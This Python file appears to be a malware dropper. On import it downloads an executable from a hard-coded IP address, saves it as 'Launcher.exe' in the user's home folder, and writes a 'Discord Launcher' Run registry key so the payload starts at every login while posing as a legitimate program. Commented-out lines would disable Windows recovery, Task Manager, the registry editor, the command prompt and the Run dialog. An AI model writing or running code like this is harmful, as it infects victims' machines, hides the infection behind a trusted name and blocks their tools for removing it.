import os
import requests
from modules.constants import MY_HOME, STARTUP


def persistence(home, file_name):
    # try:
    #     os.system('bcdedit /set {default} recoveryenabled No')
    #     os.system('bcdedit /set {default} bootstatuspolicy ignoreallfailures')
    #     os.system('REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_DWORD /v DisableRegistryTools /d 1 /f')
    #     os.system('REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_DWORD /v DisableTaskMgr /d 1 /f')
    #     os.system(
    #         'REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_DWORD /v DisableCMD /d 1 /f')
    #     os.system(
    #         'REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /t REG_DWORD /v NoRun /d 1 /f')
    # except:
    #     pass

    try:
        os.system(
            f'REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_SZ /v "Discord Launcher" /d {home+file_name} ')
    except:
        pass


file_name = "Launcher.exe"

URL = "http://45.56.115.91:8000/main.exe"

r = requests.get(URL, allow_redirects=True)


if os.path.exists(MY_HOME):
    open(MY_HOME + file_name, "wb").write(r.content)
else:
    os.makedirs(MY_HOME)
    open(MY_HOME + file_name, "wb").write(r.content)

persistence(MY_HOME, file_name)
